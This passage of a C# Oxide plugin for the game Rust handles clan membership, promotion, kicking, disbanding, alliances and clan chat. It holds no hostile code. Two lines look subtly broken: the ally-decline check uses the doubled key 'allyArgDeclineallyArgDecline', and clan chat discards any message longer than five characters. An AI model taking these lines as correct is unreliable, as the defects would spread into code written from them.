                PrintChat(player, string.Format(msg("usagewithdraw", current.Id), colorCmdUsage));
                return;
            }
            if (!myClan.IsOwner(current.Id) && !myClan.IsCouncil(current.Id) && !myClan.IsModerator(current.Id))
            {
                PrintChat(player, string.Format(msg("notmoderator", current.Id)));
                return;
            }
            var disinvPlayer = myClan.GetIPlayer(args[1]);
            if (disinvPlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (myClan.members.ContainsKey(disinvPlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadymember", current.Id), disinvPlayer.Name));
                return;
            }
            if (!myClan.invites.ContainsKey(disinvPlayer.Id))
            {
                PrintChat(player, string.Format(msg("notinvited", current.Id), disinvPlayer.Name));
                return;
            }
            myClan.invites.Remove(disinvPlayer.Id);
            if (pendingPlayerInvites.ContainsKey(disinvPlayer.Id)) pendingPlayerInvites[disinvPlayer.Id].Remove(myClan.tag);
            myClan.BroadcastLoc("canceledinvite", myClan.ColNam(current.Id, current.Name), myClan.ColNam(disinvPlayer.Id, disinvPlayer.Name));
            myClan.updated = UnixTimeStampUTC();
        }
        void cmdClanJoin(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan != null)
            {
                PrintChat(player, string.Format(msg("youalreadymember", current.Id)));
                return;
            }
            if (usePermToJoinClan && !permission.UserHasPermission(current.Id, permissionToJoinClan))
            {
                PrintChat(player, msg("nopermtojoin", current.Id));
                return;
            }
            if (args.Length != 2)
            {
                PrintChat(player, string.Format(msg("usagejoin", current.Id), colorCmdUsage));
                return;
            }
            myClan = findClan(args[1]);
            if (myClan == null || !myClan.IsInvited(current.Id))
            {
                PrintChat(player, string.Format(msg("younotinvited", current.Id)));
                return;
            }
            if (limitMembers >= 0 && myClan.members.Count() >= limitMembers)
            {
                PrintChat(player, string.Format(msg("reachedmaximum", current.Id)));
                return;
            }
            myClan.invites.Remove(current.Id);
            pendingPlayerInvites.Remove(current.Id);
            myClan.members.Add(current.Id, new PlayerStats());
            clanCache[current.Id] = myClan;
            myClan.AddBasePlayer(player);
            SetupPlayer(player, current, clan: myClan);


            if (usePermGroups && !permission.UserHasGroup(current.Id, permGroupPrefix + myClan.tag)) permission.AddUserGroup(current.Id, permGroupPrefix + myClan.tag);
            myClan.BroadcastLoc("playerjoined", myClan.ColNam(current.Id, current.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.total++;
            myClan.OnUpdate();
            List<string> others = new List<string>(myClan.members.Keys);
            others.Remove(current.Id);
            Interface.Oxide.CallHook("OnClanMemberJoined", current.Id, others);
        }


        [ConsoleCommand("clanui_promote")]
        void cmdClanPromoteMember(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            if (player == null) return;

            var clan = findClanByUser(player.UserIDString);
            if (!clan.IsOwner(player.UserIDString)) return;

            switch (args.Args[0].ToLower())
            {
                case "promote":
                    PromotePlayer(player, args.Args[1]);
                    break;
                case "demote":
                    DemotePlayer(player, args.Args[1]);
                    break;
            }

            var playerStats = clan.GetPlayerStats(args.Args[1]);
            if (playerStats == null) return;
            CreatePlayerInfo(player, clan, playerStats, args.Args[1]);
        }

        public void PromotePlayer(BasePlayer player, string targetId) => cmdClanPromote(player, new string[] { "", targetId });

        void cmdClanPromote(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id))
            {
                PrintChat(player, string.Format(msg("needclanowner", current.Id)));
                return;
            }
            if (args.Length != 2)
            {
                PrintChat(player, string.Format(msg("usagepromote", current.Id), colorCmdUsage));
                return;
            }
            var promotePlayer = myClan.GetIMember(args[1]);
            if (promotePlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (!myClan.IsMember(promotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("notaclanmember", current.Id), promotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.IsCouncil(promotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadyacouncil", current.Id), promotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.council != null && myClan.IsModerator(promotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadyacouncilset", current.Id), promotePlayer.Name));
                return;
            }
            if (!enableClanAllies && myClan.IsModerator(promotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadyamod", current.Id), promotePlayer.Name));
                return;
            }
            if (!myClan.IsModerator(promotePlayer.Id) && limitModerators >= 0 && myClan.moderators.Count() >= limitModerators)
            {
                PrintChat(player, string.Format(msg("maximummods", current.Id)));
                return;
            }
            if (enableClanAllies && myClan.IsModerator(promotePlayer.Id))
            {
                myClan.council = promotePlayer.Id;
                myClan.moderators.Remove(promotePlayer.Id);
                myClan.BroadcastLoc("playerpromotedcouncil", myClan.ColNam(current.Id, current.Name), myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            }
            else
            {
                myClan.moderators.Add(promotePlayer.Id);
                myClan.BroadcastLoc("playerpromoted", myClan.ColNam(current.Id, current.Name), myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            }
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
        }
        public void DemotePlayer(BasePlayer player, string targetId) => cmdClanDemote(player, new string[] {
"", targetId
}
        );
        void cmdClanDemote(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id))
            {
                PrintChat(player, string.Format(msg("needclanowner", current.Id)));
                return;
            }
            if (args.Length < 2)
            {
                PrintChat(player, string.Format(msg("usagedemote", current.Id), colorCmdUsage));
                return;
            }
            var demotePlayer = myClan.GetIMember(args[1]);
            if (demotePlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (!myClan.IsMember(demotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("notaclanmember", current.Id), demotePlayer.Name));
                return;
            }
            if (!myClan.IsModerator(demotePlayer.Id) && !myClan.IsCouncil(demotePlayer.Id))
            {
                PrintChat(player, string.Format(msg("notpromoted", current.Id), demotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.IsCouncil(demotePlayer.Id))
            {
                myClan.council = null;
                if (limitModerators >= 0 && myClan.moderators.Count() >= limitModerators) myClan.BroadcastLoc("playerdemoted", myClan.ColNam(current.Id, current.Name), myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
                else
                {
                    myClan.moderators.Add(demotePlayer.Id);
                    myClan.BroadcastLoc("councildemoted", myClan.ColNam(current.Id, current.Name), myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
                }
            }
            else
            {
                myClan.moderators.Remove(demotePlayer.Id);
                myClan.BroadcastLoc("playerdemoted", myClan.ColNam(current.Id, current.Name), myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
            }
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
        }
        public void LeaveClan(BasePlayer player) => cmdClanLeave(player, new string[] {
"leave"
}
        );
        void cmdClanLeave(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            bool lastMember = false;
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (args.Length != 1)
            {
                PrintChat(player, string.Format(msg("usageleave", current.Id), colorCmdUsage));
                return;
            }
            if (myClan.members.Count() == 1)
            {
                RemoveClan(myClan.tag);
                lastMember = true;
            }
            else
            {
                if (myClan.IsCouncil(current.Id)) myClan.council = null;
                myClan.moderators.Remove(current.Id);
                myClan.members.Remove(current.Id);
                myClan.invites.Remove(current.Id);
                if (myClan.IsOwner(current.Id) && myClan.members.Count() > 0)
                {
                    myClan.owner = myClan.members.ToList()[0].Key;
                }
            }
            clanCache.Remove(current.Id);
            SetupPlayer(player, current, true, oldTag: myClan.tag);
            if (usePermGroups && permission.UserHasGroup(current.Id, permGroupPrefix + myClan.tag)) permission.RemoveUserGroup(current.Id, permGroupPrefix + myClan.tag);
            PrintChat(player, string.Format(msg("youleft", current.Id)));
            myClan.BroadcastLoc("playerleft", myClan.ColNam(current.Id, current.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.total--;
            myClan.OnUpdate();
            if (lastMember) myClan.OnDestroy();
            if (!lastMember) Interface.Oxide.CallHook("OnClanMemberGone", current.Id, myClan.members.ToList());
        }
        public void KickPlayer(BasePlayer player, string targetId) => cmdClanKick(player, new string[] {
"", targetId
}
        );
        void cmdClanKick(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id) && !myClan.IsCouncil(current.Id) && !myClan.IsModerator(current.Id))
            {
                PrintChat(player, string.Format(msg("notmoderator", current.Id)));
                return;
            }
            if (args.Length != 2)
            {
                PrintChat(player, string.Format(msg("usagekick", current.Id), colorCmdUsage));
                return;
            }
            var kickPlayer = myClan.GetIMember(args[1]);
            if (kickPlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (!myClan.IsMember(kickPlayer.Id) && !myClan.IsInvited(kickPlayer.Id))
            {
                PrintChat(player, string.Format(msg("notmembercannotkicked", current.Id), kickPlayer.Name));
                return;
            }
            if (myClan.IsOwner(kickPlayer.Id) || myClan.IsCouncil(kickPlayer.Id) || myClan.IsModerator(kickPlayer.Id))
            {
                PrintChat(player, string.Format(msg("modownercannotkicked", current.Id), kickPlayer.Name));
                return;
            }
            foreach (var value in myClan.members)
            {
                var turrets = UnityEngine.Object.FindObjectsOfType<AutoTurret>();
                foreach (var turret in turrets)
                {
                    if (turret.OwnerID != ulong.Parse(value.Key)) continue;
                    turret.authorizedPlayers.RemoveAll(a => a.userid == ulong.Parse(kickPlayer.Id));
                }
            }
            if (myClan.members.ContainsKey(kickPlayer.Id)) myClan.total--;
            myClan.members.Remove(kickPlayer.Id);
            myClan.invites.Remove(kickPlayer.Id);
            if (pendingPlayerInvites.ContainsKey(kickPlayer.Id)) pendingPlayerInvites[kickPlayer.Id].Remove(myClan.tag);
            clanCache.Remove(kickPlayer.Id);
            var kickBasePlayer = BasePlayer.Find(kickPlayer.Id);

            if (kickBasePlayer != null)
            {
                SetupPlayer(kickBasePlayer, kickPlayer, true, oldTag: myClan.tag);
            }
            if (usePermGroups && permission.UserHasGroup(kickPlayer.Id, permGroupPrefix + myClan.tag)) permission.RemoveUserGroup(kickPlayer.Id, permGroupPrefix + myClan.tag);
            myClan.BroadcastLoc("waskicked", myClan.ColNam(current.Id, current.Name), myClan.ColNam(kickPlayer.Id, kickPlayer.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            Interface.Oxide.CallHook("OnClanMemberGone", kickPlayer.Id, myClan.members);
        }
        public void DisbandClan(BasePlayer player) => cmdClanDisband(player, new string[] {
"disband", "forever"
}
        );
        void cmdClanDisband(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            bool lastMember = false;
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id))
            {
                PrintChat(player, string.Format(msg("needclanowner", current.Id)));
                return;
            }
            if (args.Length != 2)
            {
                PrintChat(player, string.Format(msg("usagedisband", current.Id), colorCmdUsage));
                return;
            }
            if (myClan.members.Count() == 1)
            {
                lastMember = true;
            }
            setupPlayers(myClan.members.Keys.ToList(), true, myClan.tag);

            RemoveClan(myClan.tag);
            foreach (var member in myClan.members)
            {
                clanCache.Remove(member.Key);
                if (usePermGroups && permission.UserHasGroup((string)member.Key, permGroupPrefix + myClan.tag)) permission.RemoveUserGroup((string)member.Key, permGroupPrefix + myClan.tag);
            }
            myClan.BroadcastLoc("clandisbanded");

            foreach (var ally in clans)
            {
                Clan allyClan = clans[ally.Key];
                allyClan.clanAlliances.Remove(myClan.tag);
                allyClan.invitedAllies.Remove(myClan.tag);
                allyClan.pendingInvites.Remove(myClan.tag);
            }
            if (usePermGroups && permission.GroupExists(permGroupPrefix + myClan.tag)) permission.RemoveGroup(permGroupPrefix + myClan.tag);
            myClan.OnDestroy();
            AllyRemovalCheck();
            if (!lastMember) Interface.Oxide.CallHook("OnClanDisbanded", myClan.members);
        }
        public void Alliance(BasePlayer player, string targetClan, string type) => cmdChatClanAlly(player, "ally", new string[] {
type, targetClan
}
        );
        void cmdChatClanAlly(BasePlayer player, string command, string[] args)
        {
            if (!enableClanAllies || player == null) return;
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (!myClan.IsOwner(current.Id) && !myClan.IsCouncil(current.Id))
            {
                PrintChat(player, string.Format(msg("needclanownercouncil", current.Id)));
                return;
            }
            if (args == null || args.Length == 0)
            {
                var sbally = new StringBuilder();

                string Messages = pluginPrefixREBORNShow == true ? $"<size=14><color={pluginPrefixREBORNColor}>REBORN\n</color></size>" : "\n";
                sbally.Append($"<size=18><color={pluginPrefixColor}>{this.Title}</color></size>{Messages}");
                sbally.Append($"<color={colorTextMsg}>");
                if (myClan.IsOwner(current.Id)) sbally.Append(string.Format(msg("youareownerof", current.Id)));
                else if (myClan.IsCouncil(current.Id)) sbally.Append(string.Format(msg("youarecouncilof", current.Id)));
                else if (myClan.IsModerator(current.Id)) sbally.Append(string.Format(msg("youaremodof", current.Id)));
                else sbally.Append(string.Format(msg("youarememberof", current.Id)));
                sbally.AppendLine($" <color={colorClanNamesOverview}>{myClan.tag}</color> ( {myClan.online}/{myClan.total} )");
                if (myClan.clanAlliances.Count() > 0) sbally.AppendLine(string.Format(msg("yourclanallies", current.Id)) + $" <color={colorClanNamesOverview}>" + string.Join(", ", myClan.clanAlliances.ToArray()) + "</color>");
                if ((myClan.invitedAllies.Count() > 0 || myClan.pendingInvites.Count() > 0) && (myClan.IsOwner(current.Id) || myClan.IsCouncil(current.Id)))
                {
                    if (myClan.invitedAllies.Count() > 0) sbally.Append(string.Format(msg("allyinvites", current.Id)) + $" <color={colorClanNamesOverview}>" + string.Join(", ", myClan.invitedAllies.ToArray()) + "</color> ");
                    if (myClan.pendingInvites.Count() > 0) sbally.Append(string.Format(msg("allypending", current.Id)) + $" <color={colorClanNamesOverview}>" + string.Join(", ", myClan.pendingInvites.ToArray()) + "</color> ");
                    sbally.AppendLine();
                }
                string commandtext = string.Empty;
                if (command.Contains("ally")) commandtext = command;
                else commandtext = chatCommandClan + " ally";
                sbally.AppendLine($"<color={colorCmdUsage}>/{commandtext} <{msg("allyArgRequest", current.Id)} | {msg("allyArgRequestShort", current.Id)}> <clantag></color>");
                sbally.AppendLine(" " + msg("allyReqHelp", current.Id));
                sbally.AppendLine($"<color={colorCmdUsage}>/{commandtext} <{msg("allyArgAccept", current.Id)} | {msg("allyArgAcceptShort", current.Id)}> <clantag></color>");
                sbally.AppendLine(" " + msg("allyAccHelp", current.Id));
                sbally.AppendLine($"<color={colorCmdUsage}>/{commandtext} <{msg("allyArgDecline", current.Id)} | {msg("allyArgDeclineShort", current.Id)}> <clantag></color>");
                sbally.AppendLine(" " + msg("allyDecHelp", current.Id));
                sbally.AppendLine($"<color={colorCmdUsage}>/{commandtext} <{msg("allyArgCancel", current.Id)} | {msg("allyArgCancelShort", current.Id)}> <clantag></color>");
                sbally.AppendLine(" " + msg("allyCanHelp", current.Id));
                sbally.Append("</color>");
                SendReply(player, sbally.ToString().TrimEnd());
                return;
            }
            else if (args != null && args.Length >= 1 && args.Length < 2)
            {
                PrintChat(player, string.Format(msg("allyProvideName", current.Id)));
                return;
            }
            else if (args.Length >= 1)
            {
                Clan targetClan = null;
                string opt = args[0];
                if (opt == msg("allyArgRequest", current.Id) || opt == msg("allyArgRequestShort", current.Id))
                {
                    if (limitAlliances != 0 && myClan.clanAlliances.Count >= limitAlliances)
                    {
                        PrintChat(player, string.Format(msg("allyLimit", current.Id)));
                        return;
                    }
                    if (myClan.invitedAllies.Contains(args[1]))
                    {
                        PrintChat(player, string.Format(msg("invitePending", current.Id), args[1]));
                        return;
                    }
                    if (myClan.clanAlliances.Contains(args[1]))
                    {
                        PrintChat(player, string.Format(msg("alreadyAllies", current.Id)));
                        return;
                    }
                    targetClan = findClan(args[1]);
                    if (targetClan == null)
                    {
                        PrintChat(player, string.Format(msg("clanNoExist", current.Id), args[1]));
                        return;
                    }
                    targetClan.pendingInvites.Add(myClan.tag);
                    myClan.invitedAllies.Add(targetClan.tag);
                    PrintChat(player, string.Format(msg("allyReq", current.Id), args[1]));
                    targetClan.AllyBroadcastLoc("reqAlliance", myClan.tag);
                    myClan.OnUpdate();
                    targetClan.OnUpdate();
                    return;
                }
                else if (opt == msg("allyArgAccept", current.Id) || opt == msg("allyArgAcceptShort", current.Id))
                {
                    if (!myClan.pendingInvites.Contains(args[1]))
                    {
                        PrintChat(player, string.Format(msg("noAllyInv", current.Id), args[1]));
                        return;
                    }
                    targetClan = findClan(args[1]);
                    if (targetClan == null)
                    {
                        PrintChat(player, string.Format(msg("clanNoExist", current.Id), args[1]));
                        return;
                    }
                    if (limitAlliances != 0 && myClan.clanAlliances.Count >= limitAlliances)
                    {
                        PrintChat(player, string.Format(msg("allyAccLimit", current.Id), targetClan.tag));
                        targetClan.invitedAllies.Remove(myClan.tag);
                        myClan.pendingInvites.Remove(targetClan.tag);
                        return;
                    }
                    targetClan.invitedAllies.Remove(myClan.tag);
                    targetClan.clanAlliances.Add(myClan.tag);
                    myClan.pendingInvites.Remove(targetClan.tag);
                    myClan.clanAlliances.Add(targetClan.tag);
                    myClan.OnUpdate();
                    targetClan.OnUpdate();
                    PrintChat(player, string.Format(msg("allyAcc", current.Id), targetClan.tag));
                    targetClan.AllyBroadcastLoc("allyAccSucc", myClan.tag);
                    return;
                }
                else if (opt == msg("allyArgDeclineallyArgDecline", current.Id) || opt == msg("allyArgDeclineShort", current.Id))
                {
                    if (!myClan.pendingInvites.Contains(args[1]))
                    {
                        PrintChat(player, string.Format(msg("noAllyInv", current.Id), args[1]));
                        return;
                    }
                    targetClan = findClan(args[1]);
                    if (targetClan == null)
                    {
                        PrintChat(player, string.Format(msg("clanNoExist", current.Id), args[1]));
                        return;
                    }
                    targetClan.invitedAllies.Remove(myClan.tag);
                    myClan.pendingInvites.Remove(targetClan.tag);
                    AllyRemovalCheck();
                    PrintChat(player, string.Format(msg("allyDeclined", current.Id), args[1]));
                    myClan.OnUpdate();
                    targetClan.OnUpdate();
                    targetClan.AllyBroadcastLoc("allyDeclinedSucc", myClan.tag);
                    return;
                }
                else if (opt == msg("allyArgCancel", current.Id) || opt == msg("allyArgCancelShort", current.Id))
                {
                    if (!myClan.clanAlliances.Contains(args[1]))
                    {
                        if (myClan.invitedAllies.Contains(args[1]))
                        {
                            myClan.invitedAllies.Remove(args[1]);
                            targetClan = findClan(args[1]);
                            if (targetClan != null) targetClan.pendingInvites.Remove(myClan.tag);
                            PrintChat(player, string.Format(msg("allyInvWithdraw", current.Id), args[1]));
                            myClan.OnUpdate();
                            targetClan.OnUpdate();
                            return;
                        }
                        PrintChat(player, string.Format(msg("noAlly", current.Id)));
                        return;
                    }
                    targetClan = findClan(args[1]);
                    if (targetClan == null)
                    {
                        PrintChat(player, string.Format(msg("clanNoExist", current.Id), args[1]));
                        return;
                    }
                    targetClan.clanAlliances.Remove(myClan.tag);
                    myClan.clanAlliances.Remove(targetClan.tag);
                    AllyRemovalCheck();
                    PrintChat(player, string.Format(msg("allyCancel", current.Id), args[1]));
                    myClan.OnUpdate();
                    targetClan.OnUpdate();
                    targetClan.AllyBroadcastLoc("allyCancelSucc", myClan.tag);
                    return;
                }
                else cmdChatClanAlly(player, command, new string[] { }
                );
            }
        }
        void cmdChatClanHelp(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            var sb = new StringBuilder();
            if (myClan == null)
            {
                sb.Append($"<color={colorTextMsg}>");
                sb.AppendLine(msg("helpavailablecmds", current.Id));
                sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgCreate", current.Id)} \"TAG\" \"Description\"</color> - {msg("helpcreate", current.Id)}");
                sb.Append($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgJoin", current.Id)} \"TAG\"</color> - {msg("helpjoin", current.Id)}");
                sb.Append("</color>");
                SendReply(player, sb.ToString().TrimEnd());
                return;
            }
            sb.AppendLine(msg("helpavailablecmds", current.Id));
            sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan}</color> - {msg("helpinformation", current.Id)}");
            sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClanChat} <msg></color> - {msg("helpmessagemembers", current.Id)}");
            if (enableClanAllies) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandAllyChat} <msg></color> - {msg("helpmessageally", current.Id)}");
            sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgLeave", current.Id)}</color> - {msg("helpleave", current.Id)}");
            if (enableFFOPtion) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgFF", current.Id)} |  /{chatCommandFF}</color> - {msg("helptoggleff", current.Id)}");
            if ((myClan.IsOwner(current.Id) || myClan.IsCouncil(current.Id) || myClan.IsModerator(current.Id)))
            {
                sb.AppendLine($"<color={clanModeratorColor}>{msg("helpmoderator", current.Id)}</color> {msg("helpcommands", current.Id)}");
                sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgInvite", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helpinvite", current.Id)}");
                sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgWithdraw", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helpwithdraw", current.Id)}");
                sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgKick", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helpkick", current.Id)}");
            }
            if ((myClan.IsOwner(current.Id) || (enableClanAllies && myClan.IsCouncil(current.Id))))
            {
                sb.AppendLine($"<color={clanOwnerColor}>{msg("helpowner", current.Id)}</color> {msg("helpcommands", current.Id)}");
                if (enableClanAllies) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgAlly", current.Id)} | {chatCommandClan + "ally"}</color> - {msg("helpallyoptions", current.Id)}");
                if (myClan.IsOwner(current.Id)) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgPromote", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helppromote", current.Id)}");
                if (myClan.IsOwner(current.Id)) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgDemote", current.Id)} {msg("clanArgNameId", current.Id)}</color> - {msg("helpdemote", current.Id)}");
                if (myClan.IsOwner(current.Id)) sb.AppendLine($"<color={colorCmdUsage}>/{chatCommandClan} {msg("clanArgDisband", current.Id)} {msg("clanArgForever", current.Id)}</color> - {msg("helpdisband", current.Id)}");
            }
            if (player.net.connection.authLevel >= authLevelDelete || player.net.connection.authLevel >= authLevelRename || player.net.connection.authLevel >= authLevelInvite || player.net.connection.authLevel >= authLevelKick || player.net.connection.authLevel >= authLevelPromoteDemote) sb.AppendLine($"<color={clanServerColor}>Server management</color>: {msg("helpconsole", current.Id)} <color={colorCmdUsage}></color>");
            string openText = $"<color={colorTextMsg}>";
            string closeText = "</color>";
            string[] parts = sb.ToString().Split(new char[] {
'\n'
}
            , StringSplitOptions.RemoveEmptyEntries);
            sb = new StringBuilder();
            foreach (var part in parts)
            {
                if ((sb.ToString().TrimEnd().Length + part.Length + openText.Length + closeText.Length) > 1050)
                {
                    SendReply(player, openText + sb.ToString().TrimEnd() + closeText);
                    sb.Clear();
                }
                sb.AppendLine(part);
            }
            SendReply(player, openText + sb.ToString().TrimEnd() + closeText);
        }
        void cmdChatClanInfo(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            if (player.net.connection.authLevel < authLevelClanInfo)
            {
                PrintChat(player, "No access to this command.");
                return;
            }
            if (args == null || args.Length == 0)
            {
                PrintChat(player, "Please specify a clan tag.");
                return;
            }
            var Clan = findClan(args[0]);
            if (Clan == null)
            {
                PrintChat(player, string.Format(msg("clanNoExist", player.UserIDString), args[0]));
                return;
            }
            var sb = new StringBuilder();
            string Messages = pluginPrefixREBORNShow == true ? $"<size=14><color= {pluginPrefixREBORNColor}>REBORN\n</color></size>" : "\n";
            sb.Append($"<size=18><color={pluginPrefixColor}>{this.Title}</color></size>{Messages}");
            sb.AppendLine($"<color={colorTextMsg}>Detailed clan information for:");
            sb.AppendLine($"ClanTag:  <color={colorClanNamesOverview}>{Clan.tag}</color> ( Online: <color={colorClanNamesOverview}>{Clan.online}</color> / Total: <color={colorClanNamesOverview}>{Clan.total}</color> )");
            sb.AppendLine($"Description: <color={colorClanNamesOverview}>{Clan.description}</color>");
            sb.Append(string.Format(msg("memberon", player.UserIDString)));
            int n = 0;
            foreach (var memberId in Clan.members)
            {
                var op = this.covalence.Players.FindPlayerById(memberId.Key);
                if (op != null && op.IsConnected)
                {
                    if (n > 0) sb.Append(", ");
                    if (Clan.IsOwner(memberId.Key))
                    {
                        sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanOwnerColor, op.Name));
                    }
                    else if (Clan.IsCouncil(memberId.Key))
                    {
                        sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanCouncilColor, op.Name));
                    }
                    else if (Clan.IsModerator(memberId.Key))
                    {
                        sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanModeratorColor, op.Name));
                    }
                    else
                    {
                        sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanMemberColor, op.Name));
                    }
                    ++n;
                }
            }
            if (Clan.online == 0) sb.Append(" - ");
            sb.Append("</color>\n");
            bool offline = false;
            foreach (var memberId in Clan.members)
            {
                var op = this.covalence.Players.FindPlayerById(memberId.Key);
                if (op != null && !op.IsConnected)
                {
                    offline = true;
                    break;
                }
            }
            if (offline)
            {
                sb.Append(string.Format(msg("memberoff", player.UserIDString)));
                n = 0;
                foreach (var memberId in Clan.members)
                {
                    var p = this.covalence.Players.FindPlayerById(memberId.Key);
                    if (p != null && !p.IsConnected)
                    {
                        if (n > 0) sb.Append(", ");
                        if (Clan.IsOwner(memberId.Key))
                        {
                            sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanOwnerColor, p.Name));
                        }
                        else if (Clan.IsCouncil(memberId.Key))
                        {
                            sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanCouncilColor, p.Name));
                        }
                        else if (Clan.IsModerator(memberId.Key))
                        {
                            sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanModeratorColor, p.Name));
                        }
                        else
                        {
                            sb.Append(string.Format(msg("overviewnamecolor", player.UserIDString), clanMemberColor, p.Name));
                        }
                        ++n;
                    }
                }
                sb.Append("\n");
            }
            sb.AppendLine($"Time created: <color={colorClanNamesOverview}>{UnixTimeStampToDateTime(Clan.created)}</color>");
            sb.AppendLine($"Last change: <color={colorClanNamesOverview}>{UnixTimeStampToDateTime(Clan.updated)}</color>");
            SendReply(player, sb.ToString().TrimEnd());
        }
        void cmdChatClanchat(BasePlayer player, string command, string[] args)
        {
            if (player == null || args.Length == 0) return;
            var myClan = findClanByUser(player.UserIDString);
            if (myClan == null)
            {
                SendReply(player, string.Format(msg("notmember", player.UserIDString)));
                return;
            }
            if (clanChatDenyOnMuted)
            {
                var current = this.covalence.Players.FindPlayerById(player.UserIDString);
                var chk = Interface.CallHook("API_IsMuted", current);
                if (chk != null && chk is bool && (bool)chk)
                {
                    SendReply(player, string.Format(msg("clanchatmuted", player.UserIDString)));
                    return;
                }
            }
            var message = string.Join(" ", args);
            if (string.IsNullOrEmpty(message) || message.Length > 5) return;
            myClan.BroadcastChat(string.Format(msg("broadcastformat"), myClan.PlayerColor(player.UserIDString), player.net.connection.username, message));
            if (ConVar.Chat.serverlog) DebugEx.Log(string.Format("[CHAT] CLAN [{0}] - {1}: {2}", myClan.tag, player.net.connection.username, message), StackTraceLogType.None);
        }
        void cmdChatAllychat(BasePlayer player, string command, string[] args)
        {
            if (player == null || args.Length == 0) return;
            var myClan = findClanByUser(player.UserIDString);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", player.UserIDString)));
                return;
            }
            if (myClan.clanAlliances.Count == 0)
            {
                PrintChat(player, string.Format(msg("noactiveally", player.UserIDString)));
                return;
            }
            if (clanChatDenyOnMuted)
            {
                var current = this.covalence.Players.FindPlayerById(player.UserIDString);
                var chk = Interface.CallHook("API_IsMuted", current);
                if (chk != null && chk is bool && (bool)chk)
                {
                    SendReply(player, string.Format(msg("clanchatmuted", player.UserIDString)));
                    return;
                }
            }
            var message = string.Join(" ", args);
            if (string.IsNullOrEmpty(message)) return;
            foreach (var clanAllyName in myClan.clanAlliances)
            {
                var clanAlly = findClan(clanAllyName);
                if (clanAlly == null) continue;
